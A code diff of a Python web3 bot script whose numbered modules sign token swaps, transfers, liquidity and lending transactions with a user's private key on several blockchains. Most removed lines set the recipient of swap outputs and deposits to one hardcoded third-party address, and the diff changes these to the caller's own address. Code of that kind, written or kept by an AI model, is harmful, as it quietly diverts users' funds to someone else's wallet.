@@ -36,7 +36,7 @@ def module_5_a(address, private_key):
 
         wmatic = Web3.toChecksumAddress("0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270")
         pos_usdc = Web3.toChecksumAddress("0x2791bca1f2de4661ed88a30c99a7a9449aa84174")
-        who_swap = Web3.toChecksumAddress("0x81289035b2A56028ad488618B2FEe7d17f1cd2f1")
+        who_swap = Web3.toChecksumAddress(address)
         value = 100000000000000
 
         data = contract.encodeABI(
@@ -109,7 +109,7 @@ def module_10_a(address, private_key):
         account = Account.from_key(recipient_private_key)
         recipient_address = account.address
 
-        amount = 80
+        amount = 1
 
         transfer_function = contract.get_function_by_selector("0xa9059cbb")
         try:
@@ -166,7 +166,7 @@ def module_11_a(address, private_key):
 
         wmatic = Web3.toChecksumAddress("0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270")
         pos_usdt = Web3.toChecksumAddress("0xc2132d05d31c914a87c6611c10748aeb04b58e8f")
-        who_swap = Web3.toChecksumAddress("0x81289035b2A56028ad488618B2FEe7d17f1cd2f1")
+        who_swap = Web3.toChecksumAddress(address)
         value = 10000000000000
 
         data = contract.encodeABI(
@@ -201,7 +201,7 @@ def module_11_a(address, private_key):
 
             raw_tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
             tx_hash = web3.toHex(raw_tx_hash)
-            print(f"TX hash: {tx_hash}")
+            logger.success(f"Wallet {address[:9]}, transaction hash - {tx_hash}")
         except Exception as e:
             logger.error(e)
 
@@ -241,7 +241,7 @@ def module_11_b(address, private_key):
 
         wmatic = Web3.toChecksumAddress("0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270")
         dai = Web3.toChecksumAddress("0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063")
-        who_swap = Web3.toChecksumAddress("0x81289035b2A56028ad488618B2FEe7d17f1cd2f1")
+        who_swap = Web3.toChecksumAddress(address)
         value = 10000000000000
 
         data = contract.encodeABI(
@@ -394,7 +394,7 @@ def module_13_a(address, private_key):
 
         wmatic = Web3.toChecksumAddress("0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270")
         wbtc_usdt = Web3.toChecksumAddress("0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6")
-        who_swap = Web3.toChecksumAddress("0x81289035b2A56028ad488618B2FEe7d17f1cd2f1")
+        who_swap = Web3.toChecksumAddress(address)
         value = 10000000000000000  # 0.01 matic
 
         data = contract.encodeABI(
@@ -473,8 +473,8 @@ def module_13_b(address, private_key):
 
         wmatic = Web3.toChecksumAddress("0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270")
         pos_usdt = Web3.toChecksumAddress("0xc2132d05d31c914a87c6611c10748aeb04b58e8f")
-        who_swap = Web3.toChecksumAddress("0x81289035b2a56028ad488618b2fee7d17f1cd2f1")
-        value = 100000000000000000  # 0.1 matic
+        who_swap = Web3.toChecksumAddress(address)
+        value = 300000000000000000  # 0.1 matic
 
         data = contract.encodeABI(
             fn_name="exactInputSingle",
@@ -605,8 +605,8 @@ def module_13_d(address, private_key):
 
         i = 2
         j = 3
-        _dx = 50000
-        _min_dy = 238
+        _dx = 100000
+        _min_dy = 476
 
         exchange_underlying_function = contract.get_function_by_selector("0x65b2489b")
 
@@ -840,7 +840,7 @@ def module_13_h(address, private_key):
 
         contract = web3.eth.contract(address=contract_address, abi=abi)
 
-        _value = 338441969609
+        _value = 383000000000
 
         deposit_function = contract.get_function_by_selector("0xb6b55f25")
 
@@ -1052,7 +1052,7 @@ def module_17_a(address, private_key):
 
         wmatic = Web3.toChecksumAddress("0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270")
         pos_weth = Web3.toChecksumAddress("0x7ceb23fd6bc0add59e62ac25578270cff1b9f619")
-        who_swap = Web3.toChecksumAddress("0x81289035b2A56028ad488618B2FEe7d17f1cd2f1")
+        who_swap = Web3.toChecksumAddress(address)
         value = 10000000000000000
 
         data = contract.encodeABI(
@@ -1129,7 +1129,7 @@ def module_17_b(address, private_key):
 
         wmatic = Web3.toChecksumAddress("0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270")
         pos_usdt = Web3.toChecksumAddress("0xc2132d05d31c914a87c6611c10748aeb04b58e8f")
-        who_swap = Web3.toChecksumAddress("0x81289035b2A56028ad488618B2FEe7d17f1cd2f1")
+        who_swap = Web3.toChecksumAddress(address)
         value = 1500000000000000000
 
         data = contract.encodeABI(
@@ -1206,7 +1206,7 @@ def module_17_c(address, private_key):
 
         wmatic = Web3.toChecksumAddress("0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270")
         pos_usdc = Web3.toChecksumAddress("0x2791bca1f2de4661ed88a30c99a7a9449aa84174")
-        who_swap = Web3.toChecksumAddress("0x81289035b2A56028ad488618B2FEe7d17f1cd2f1")
+        who_swap = Web3.toChecksumAddress(address)
         value = 1500000000000000000
 
         data = contract.encodeABI(
@@ -2160,7 +2160,7 @@ def module_18_c(address, private_key):
 
         weth = Web3.toChecksumAddress("0x4200000000000000000000000000000000000006")
         usdt = Web3.toChecksumAddress("0x94b008aa00579c1307b0ef2c499ad98a8ce58e58")
-        who_swap = Web3.toChecksumAddress("0x81289035b2A56028ad488618B2FEe7d17f1cd2f1")
+        who_swap = Web3.toChecksumAddress(address)
         value = 1000000000000
 
         data = contract.encodeABI(
@@ -2300,7 +2300,7 @@ def module_18_e(address, private_key):
         amount1Desired = 100
         amount0Min = 0
         amount1Min = 0
-        recipient = Web3.toChecksumAddress("0x81289035b2A56028ad488618B2FEe7d17f1cd2f1")
+        recipient = Web3.toChecksumAddress(address)
         now = datetime.datetime.today().strftime("%Y-%m-%d %H:%M:%S")
         deadline = int(
             time.mktime(
@@ -2394,7 +2394,7 @@ def module_18_f(address, private_key):
 
         weth = Web3.toChecksumAddress("0x82af49447d8a07e3bd95bd0d56f35241523fbab1")
         usdt = Web3.toChecksumAddress("0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9")
-        who_swap = Web3.toChecksumAddress("0x81289035b2A56028ad488618B2FEe7d17f1cd2f1")
+        who_swap = Web3.toChecksumAddress(address)
         value = 1000000000000
 
         data = contract.encodeABI(
@@ -2535,7 +2535,7 @@ def module_18_h(address, private_key):
         amount1Desired = 100
         amount0Min = 64073210617
         amount1Min = 100
-        recipient = Web3.toChecksumAddress("0x81289035b2A56028ad488618B2FEe7d17f1cd2f1")
+        recipient = Web3.toChecksumAddress(address)
         now = datetime.datetime.today().strftime("%Y-%m-%d %H:%M:%S")
         deadline = int(
             time.mktime(
@@ -2627,7 +2627,7 @@ def module_21_a(address, private_key):
         contract = web3.eth.contract(address=contract_address, abi=abi)
 
         undefined = "0x794a61358D6845594F94dc1DB02A252b5b4814aD"
-        onBehalfOf = "0x81289035b2A56028ad488618B2FEe7d17f1cd2f1"
+        onBehalfOf = address
         referralCode = 0
 
         value = 1000000000000
@@ -2691,7 +2691,7 @@ def module_21_b(address, private_key):
 
         contract = web3.eth.contract(address=contract_address, abi=abi)
 
-        args = '0x0000000000000000000000000002000000000000000000000000000003e80002'
+        args = "0x0000000000000000000000000002000000000000000000000000000003e80002"
 
         try:
             borrow_function = contract.get_function_by_selector("0xd5eed868")
